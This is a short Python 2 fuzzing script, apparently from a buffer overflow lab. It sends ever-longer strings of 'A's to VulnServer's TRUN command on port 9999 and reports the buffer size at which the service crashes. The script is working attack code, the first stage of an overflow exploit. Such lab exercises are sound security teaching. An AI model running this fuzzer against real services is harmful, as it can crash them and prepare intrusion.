#!/usr/bin/python
# Carlos Enamorado 
# 10/17/2023
# Fuzzing for Buffer Overflow PoC on VulnServer
# Script will report the size of the buffer at which the service crashed

import sys, socket
from time import sleep

buffer = "A" * 100

while True:
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('<VITCIM IP>',9999))

        s.send(('TRUN /.:/' + buffer))
        s.close()
        sleep(1)
        buffer = buffer + "A"*100

    except:
        print "Fuzzing Crashed at %s bytes" % str(len(buffer))
        sys.exit()
